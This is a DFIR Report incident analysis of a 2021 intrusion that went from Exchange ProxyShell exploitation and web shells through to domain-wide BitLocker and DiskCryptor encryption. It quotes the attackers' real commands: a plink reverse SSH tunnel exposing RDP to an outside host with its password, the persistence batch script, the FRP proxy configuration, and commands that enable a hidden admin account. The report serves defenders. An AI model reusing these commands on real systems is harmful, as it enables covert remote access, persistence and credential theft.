        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>								</nav><!-- #site-navigation -->
            			</div>
        				</div><!-- .wrap -->
     				</div><!-- .navigation-top -->
				<div class="clock"> 
					<div id="time"></div>
					<div id="date">Tuesday, March 11, 2025</div>
				</div>
				</div><!-- #nav-sticker -->
				       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			</div><!-- .main-header-brand -->
						
							</div><!-- .main-header -->
	</header><!-- #masthead -->

	<div id="content" class="site-content">
		<div class="site-content-cell">
						<div class="wrap wrap-width">

	<div id="primary" class="content-area">
		<main id="main" class="site-main">

		
<article id="post-4551" class="post-4551 post type-post status-publish format-standard hentry category-exploit category-fast-reverse-proxy category-phosphorus category-plink category-proxyshell category-ransomware entry">
	
	<div class="entry-content-holder">
		<header class="entry-header">

		
				<div class="entry-meta">

					
		<span class="cat-links">
		
			<a class="category-color-34" href="https://thedfirreport.com/category/exploit/">exploit</a>
		
			<a class="category-color-87" href="https://thedfirreport.com/category/fast-reverse-proxy/">Fast Reverse Proxy</a>
		
			<a class="category-color-104" href="https://thedfirreport.com/category/phosphorus/">PHOSPHORUS</a>
		
			<a class="category-color-86" href="https://thedfirreport.com/category/plink/">Plink</a>
		
			<a class="category-color-88" href="https://thedfirreport.com/category/proxyshell/">ProxyShell</a>
		
			<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
				</span>
	
				</div><!-- .entry-meta -->
			<h1 class="entry-title">Exchange Exploit Leads to Domain Wide Ransomware</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2021-11-15T02:06:59+00:00">November 15, 2021</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		<div class="markdown">
<p>In late September 2021, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case were attributed to a group <a href="https://www.microsoft.com/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021/" target="_blank" rel="noopener">Microsoft</a> tracks as <a href="https://attack.mitre.org/groups/G0059/" target="_blank" rel="noopener">PHOSPHORUS</a> (possible overlap with UNC2448, NemesisKitten, and DEV-0270) which is suspected to be an Iranian nation state operator.</p>
<p>ProxyShell was used to deploy multiple web shells which lead to discovery actions, dumping of LSASS, use of Plink and <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">Fast Reverse Proxy</a> to proxy RDP connections into the environment. Furthermore, the actors encrypted systems domain wide, using BitLocker on servers and <a href="https://github.com/DavidXanatos/DiskCryptor" target="_blank" rel="noopener">DiskCryptor</a> on workstations, rather than affiliating with Ransomware as a Service (RaaS) programs or building an encryptor from scratch.</p>
<p>ProxyShell is a name given to a combination of three vulnerabilities: CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207. An attacker chaining the exploitation of these vulnerabilities could execute arbitrary code with SYSTEM privileges on Exchange servers. Here&#8217;s some more information on ProxyShell : <a href="https://us-cert.cisa.gov/ncas/current-activity/2021/08/21/urgent-protect-against-active-exploitation-proxyshell" target="_blank" rel="noopener">CISA Alert</a>, <a href="https://www.ncsc.gov.ie/pdfs/MS_Proxyshell_060921.pdf" target="_blank" rel="noopener">NCSC Alert</a>, <a href="https://www.mandiant.com/resources/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers" target="_blank" rel="noopener">Mandiant</a>, <a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell" target="_blank" rel="noopener">Zero Day Initiative</a>.</p>
</div>
<p>The threat actors conducted this intrusion with almost no malware. It was a rare occurrence of a ransomware attack where Cobalt Strike was not used or any other C2 framework.</p>
<h2 id="services">Services</h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>Contact us today for a demo!</p>
<div class="markdown">
<h2 id="case-summary">Case Summary</h2>
<p>We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells. Over the course of three days, three different web shells were dropped in publicly accessible directories. These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.</p>
<p>After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells. This battery of initial discovery included a network call out to themoscowtimes[.]com. The threat actors repeated these tests twice over the first two days. On the third day, the next phase of the intrusion was underway.</p>
<p>Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups. The threat actors then dropped <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener">Plink</a> and established an SSH tunnel to expose RDP over the tunnel. They then connected to the Exchange server over RDP using the DefaultAccount account.</p>
<p>They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk. This compressed file had a few files in it:</p>
<ul>
<li>CacheTask.bat</li>
<li>CacheTask.xml</li>
<li>dllhost.exe</li>
<li>install-proxy.bat</li>
<li>RuntimeBroker</li>
</ul>
</div>
<p>Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder. A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">Fast Reverse Proxy</a> (FRP) which was used to proxy RDP traffic during the intrusion.</p>
<p>Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager. Thirty minutes later, the threat actor started using a domain administrator account.</p>
<p>Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP. Targeted servers included backup systems and domain controllers. The threat actor also deployed the FRP package to these systems after gaining access.</p>
<p>Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations<strong>.</strong> Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.</p>
<p>To encrypt workstations, an open source utility called <a href="https://github.com/DavidXanatos/DiskCryptor" target="_blank" rel="noopener">DiskCryptor</a> was utilized. This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption. The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.</p>
<p>The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours. If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.</p>
<p>The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.</p>
<h2 id="timeline">Timeline</h2>
<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-4643" src="https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3.png" alt="" width="1560" height="2060" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3.png 1560w, https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3-227x300.png 227w, https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3-775x1024.png 775w, https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3-768x1014.png 768w, https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3-1163x1536.png 1163w, https://thedfirreport.com/wp-content/uploads/2021/11/Exchange-Exploit-Leads-to-Domain-Wide-Ransomware3-1551x2048.png 1551w" sizes="(max-width: 1560px) 100vw, 1560px" /></p>
<p>Analysis and reporting completed by <a href="https://twitter.com/0xtornado" target="_blank" rel="noopener">@0xtornado</a> &amp; @<a href="https://twitter.com/v3t0_" target="_blank" rel="noreferrer noopener">v3t0_</a></p>
<p>Reviewed by <a href="https://twitter.com/samaritan_o" target="_blank" rel="noreferrer noopener">@samaritan_o</a> &amp; <a href="https://twitter.com/svch0st" target="_blank" rel="noopener">@svch0st</a></p>
<h2 id="mitre-attck">MITRE ATT&amp;CK</h2>
<h3 id="initial-access">Initial Access</h3>
<p>This time we will talk about ProxyShell, which revealed itself around August 2021. Once again, the vulnerability affects Microsoft Exchange servers. Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019. It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (<a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">@orange_8361</a>), includes a chain of 3 different CVEs:</p>
<ul>
<li>CVE-2021-34473</li>
<li>CVE-2021-34523</li>
<li>CVE-2021-31207</li>
</ul>
<p>In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021-31207). This last CVE allowed the creation of multiple web shells. The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:</p>
<pre>Get-MailboxRegionalConfiguration
Get-Mailbox
Get-ExchangeServer
Get-InboxRule</pre>
<p>This was shortly followed by the cmdlet &#8220;New-ManagementRoleAssignment&#8221; responsible for granting mailbox import/export privileges before running &#8220;New-MailboxExportRequest&#8221;. The cmdlet would export a Mailbox to a provided location with the .aspx extention. While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.</p>
<p>Below is an example of one of the IPs who successfully exploited the vulnerabilities:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/5d0eb2f1c8944faf7dfe1063e8abbccc58f38382fea4ecaa01b8e581c76d858b.png"><img decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/5d0eb2f1c8944faf7dfe1063e8abbccc58f38382fea4ecaa01b8e581c76d858b.png" alt="Proxyshell" width="1538" height="354" /></a></p>
<p>Three web shells were spotted during our investigation:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/39a3f7cd78ddbeac5e672df04999be461a14ebd7dc5d1726b1e037049849811d.png"><img decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/39a3f7cd78ddbeac5e672df04999be461a14ebd7dc5d1726b1e037049849811d.png" alt="Initial Access" width="1914" height="248" /></a></p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4654" src="https://thedfirreport.com/wp-content/uploads/2021/11/Web-Shell-Creation8.png" alt="" width="963" height="356" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/Web-Shell-Creation8.png 963w, https://thedfirreport.com/wp-content/uploads/2021/11/Web-Shell-Creation8-300x111.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/Web-Shell-Creation8-768x284.png 768w" sizes="auto, (max-width: 963px) 100vw, 963px" /></p>
<p>The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe. We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that&#8217;s why the parent process is w3wp. Here&#8217;s what the web shell looked like:</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4573" src="https://thedfirreport.com/wp-content/uploads/2021/11/1-2.png" alt="" width="393" height="169" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/1-2.png 393w, https://thedfirreport.com/wp-content/uploads/2021/11/1-2-300x129.png 300w" sizes="auto, (max-width: 393px) 100vw, 393px" /></p>
<p>This is the web shell code for login.aspx:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/2d8fc60bb1f37a14e73f36bcacbc57784c6d816eab4c2f2542c963160279adff.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/2d8fc60bb1f37a14e73f36bcacbc57784c6d816eab4c2f2542c963160279adff.png" alt="Login.aspx" width="1176" height="598" /></a></p>
<p>The other two web shells were dropped upon the successful exploitation of ProxyShell. Running <em>file</em> command on these two web shells, show that they are actually PST files that contain web shell:</p>
<pre><code><span class="hljs-variable">$ </span>file *
aspx_gtonvbgidhh.<span class="hljs-symbol">aspx:</span> <span class="hljs-constant">Microsoft</span> <span class="hljs-constant">Outlook</span> email folder (&gt;=<span class="hljs-number">2003</span>)
aspx_qdajscizfzx.<span class="hljs-symbol">aspx:</span> <span class="hljs-constant">Microsoft</span> <span class="hljs-constant">Outlook</span> email folder (&gt;=<span class="hljs-number">2003</span>)
</code></pre>
<p>The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/4f00effd2d326db8f55c27006aad80ffaf4d25cdda059cc397d9d7ae1538631f.png"><img loading="lazy" decoding="async" class="alignnone wp-image-4513 size-full" src="https://thedfirreport.com/wp-content/uploads/2021/11/4f00effd2d326db8f55c27006aad80ffaf4d25cdda059cc397d9d7ae1538631f.png" alt="" width="964" height="626" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/4f00effd2d326db8f55c27006aad80ffaf4d25cdda059cc397d9d7ae1538631f.png 964w, https://thedfirreport.com/wp-content/uploads/2021/11/4f00effd2d326db8f55c27006aad80ffaf4d25cdda059cc397d9d7ae1538631f-300x195.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/4f00effd2d326db8f55c27006aad80ffaf4d25cdda059cc397d9d7ae1538631f-768x499.png 768w" sizes="auto, (max-width: 964px) 100vw, 964px" /></a></p>
<p>The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/698c2ba5d0d4708b5d47fc8d7c5cddde918d526e5a06fc913f120d0a15d635d8.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/698c2ba5d0d4708b5d47fc8d7c5cddde918d526e5a06fc913f120d0a15d635d8.png" alt="enter image description here" width="933" height="631" /></a></p>
<h3 id="execution">Execution</h3>
<p>The threat actors executed a script named install-proxy.bat, containing the following lines of code:</p>
<pre><code>@echo off
cd /D "%~dp0"
mkdir C:\ProgramData\Microsoft\Windows\Runtime\
mkdir C:\ProgramData\Microsoft\Windows\DllHost\

move /Y dllhost.exe C:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe
move /Y RuntimeBroker C:\ProgramData\Microsoft\Windows\Runtime\RuntimeBroker
move /Y CacheTask.bat C:\ProgramData\Microsoft\CacheTask.bat

schtasks.exe /<span class="hljs-operator"><span class="hljs-keyword">End</span> /tn <span class="hljs-string">"\Microsoft\Windows\Maintenance\CacheTask"</span>
schtasks.exe /<span class="hljs-keyword">Delete</span> /tn <span class="hljs-string">"\Microsoft\Windows\Maintenance\CacheTask"</span>
schtasks.exe /<span class="hljs-keyword">Create</span> /<span class="hljs-keyword">F</span> /<span class="hljs-keyword">XML</span> CacheTask.<span class="hljs-keyword">xml</span> /tn <span class="hljs-string">"\Microsoft\Windows\Maintenance\CacheTask"</span>
schtasks.exe /Run /tn <span class="hljs-string">"\Microsoft\Windows\Maintenance\CacheTask"</span>

del /<span class="hljs-keyword">F</span> CacheTask.<span class="hljs-keyword">xml</span>

<span class="hljs-keyword">start</span> /b <span class="hljs-string">""</span> cmd /<span class="hljs-keyword">c</span> del <span class="hljs-string">"%~f0"</span>&amp;<span class="hljs-keyword">exit</span> /b</span></code></pre>
<p>The script creates two directories, then moves files into their respective directories. It first stops and then deletes a task named CacheTask if it exists. It then Creates a schedule task which will call an XML file which then executes CacheTask.bat</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4591" src="https://thedfirreport.com/wp-content/uploads/2021/11/1-5.png" alt="" width="544" height="483" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/1-5.png 544w, https://thedfirreport.com/wp-content/uploads/2021/11/1-5-300x266.png 300w" sizes="auto, (max-width: 544px) 100vw, 544px" /></p>
<p>CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy<strong> (</strong><a href="https://github.com/fatedier/frp">FRP</a>) binary:</p>
<pre><code>:<span class="hljs-keyword">loop</span>

<span class="hljs-attribute">C</span>:\ProgramData\Microsoft\Windows\DllHost\dllhost.exe

goto <span class="hljs-keyword">loop</span></code></pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/875114a0effd7f5fcd1ed099bea36dfef07ddb1060d65dc21446ebfff8cbc4d8.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/875114a0effd7f5fcd1ed099bea36dfef07ddb1060d65dc21446ebfff8cbc4d8.png" alt="dllhost.exe" width="1663" height="381" /></a></p>
<p>Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth&#8217;s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/88e1bbfafc42458aa8a27efeb95530d5282ceb0af2170db607d20bbf63484b7b.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/88e1bbfafc42458aa8a27efeb95530d5282ceb0af2170db607d20bbf63484b7b.png" alt="Hash" width="1308" height="759" /></a></p>
<p>The C:\ProgramData\Microsoft\Windows\Runtime\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:</p>
<pre><code><span class="hljs-title">[common]</span>
<span class="hljs-setting">log_level = <span class="hljs-value">trace</span></span>
<span class="hljs-setting">login_fail_exit = <span class="hljs-value"><span class="hljs-keyword">true</span></span></span>
<span class="hljs-title">
[RedactedHOSTNAME.RedactedDOMAIN_RedactedIP]</span>
<span class="hljs-setting">type = <span class="hljs-value">tcp</span></span>
<span class="hljs-setting">remote_port = <span class="hljs-value"><span class="hljs-number">10151</span></span></span>
<span class="hljs-setting">plugin = <span class="hljs-value">http_proxy</span></span>
<span class="hljs-setting">use_encryption = <span class="hljs-value"><span class="hljs-keyword">true</span></span></span>
<span class="hljs-setting">use_compression = <span class="hljs-value"><span class="hljs-keyword">true</span></span></span></code></pre>
<p>The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.</p>
<p>The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:</p>
<pre>"powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/11/06cd805e9bdccced882075d49cfc8e6a51282897d54961934769e47c7515e417.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/06cd805e9bdccced882075d49cfc8e6a51282897d54961934769e47c7515e417.png" alt="Plink" width="1887" height="177" /></a></p>
<p>In the command line above you can see several options being used:</p>
<pre>-N : To avoid starting the shell
-T : To avoid the allocation of a pseudo-terminal
-R : Forward remote port to local address
-P 22 : Port number
-l forward : Login name
-pw Socks@123 : Login password
-no-antispoof : To omit anti-spoofing prompt after authentication</pre>
<p>After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.</p>
<h3 id="persistence">Persistence</h3>
<p><strong>Valid Accounts</strong><br />
To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount. It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic. The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#defaultaccount" target="_blank" rel="noopener">Reference</a>).</p>
<p>To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:</p>
<pre><code><span class="hljs-string">"powershell.exe"</span> /c net user DefaultAccount /<span class="hljs-attribute">active</span>:<span class="hljs-literal">yes</span></code></pre>
<p>After activating the account, the threat actors set the password of this account to P@ssw0rd and added it to Administrators and Remote Desktop Users groups.</p>
<pre><code><span class="hljs-string">"powershell.exe"</span> /c net user DefaultAccount P<span class="hljs-property">@ssw0rd</span>
<span class="hljs-string">"powershell.exe"</span> /c net localgroup <span class="hljs-string">"Remote Desktop Users"</span> /Add DefaultAccount
<span class="hljs-string">"powershell.exe"</span> /c net localgroup Administrators /Add DefaultAccount</code></pre>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>ProxyShell exploitation provided the threat actors with NT AUTHORITY\SYSTEM privileges. Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials. Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.</p>
<h3 id="defense-evasion">Defense Evasion</h3>
<p>Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion. However, the threat actors performed masquerading with many of their tools:</p>
<ul>
<li>They created login.aspx web shell in the same folder as the legitimate OWA login page.</li>
<li>They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy</li>
<li>They created the Scheduled Task with &#8220;\Microsoft\Windows\Maintenance\CacheTask&#8221; name to stay un-noticed</li>
</ul>
<h3 id="credential-access">Credential Access</h3>
<p><strong>LSASS Dump</strong><br />
The threat actors dumped LSASS process manually using the Task Manager <a href="https://car.mitre.org/analytics/CAR-2019-08-001/" target="_blank" rel="nofollow noopener">CAR-2019-08-001</a>:</p>
<pre><code>File created:
RuleName: -
UtcTime: REDACTED <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24.958</span>
ProcessGuid: {BF388D9C-AB02-<span class="hljs-number">614</span>D-B552-<span class="hljs-number">000000000700</span>}
ProcessId: <span class="hljs-number">17480</span>
Image: C:\Windows\system32\taskmgr.exe
TargetFilename: C:\Users\DefaultAccount\AppData\Local\Temp\<span class="hljs-number">2</span>\lsass.DMP</code></pre>
<p>To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:</p>
<pre><code>File created:
RuleName: -
UtcTime: REDACTED <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">48.698</span>
ProcessGuid: {BF388D9C-AADF-<span class="hljs-number">614</span>D-A052-<span class="hljs-number">000000000700</span>}
ProcessId: <span class="hljs-number">17412</span>
Image: C:\Windows\Explorer.EXE
TargetFilename: C:\Users\DefaultAccount\AppData\Local\Temp\<span class="hljs-number">2</span>\lsass.zip</code></pre>
<h3 id="discovery">Discovery</h3>
<h4 id="environment-discovery">Environment Discovery</h4>
<p>As previously mentioned, we saw multiple cmdlets related to exchange:</p>
<pre>Get-MailboxRegionalConfiguration
Get-Mailbox
Get-ExchangeServer
Get-InboxRule</pre>
<p>Using the dropped web shells, the threat actors performed the following commands:<br />
<img loading="lazy" decoding="async" class="alignnone size-full wp-image-4605" src="https://thedfirreport.com/wp-content/uploads/2021/11/Webshell-Execution.png" alt="" width="1444" height="930" srcset="https://thedfirreport.com/wp-content/uploads/2021/11/Webshell-Execution.png 1444w, https://thedfirreport.com/wp-content/uploads/2021/11/Webshell-Execution-300x193.png 300w, https://thedfirreport.com/wp-content/uploads/2021/11/Webshell-Execution-1024x660.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/11/Webshell-Execution-768x495.png 768w" sizes="auto, (max-width: 1444px) 100vw, 1444px" /></p>
<h4 id="port-scanning">Port Scanning</h4>
<p>The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:<br />
<a href="https://thedfirreport.com/wp-content/uploads/2021/11/91263d06cdcad9625480f8e871da2278d2c4c5c9ca099ca3cc352d07c75676f1.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/11/91263d06cdcad9625480f8e871da2278d2c4c5c9ca099ca3cc352d07c75676f1.png" alt="Kport" width="642" height="503" /></a></p>
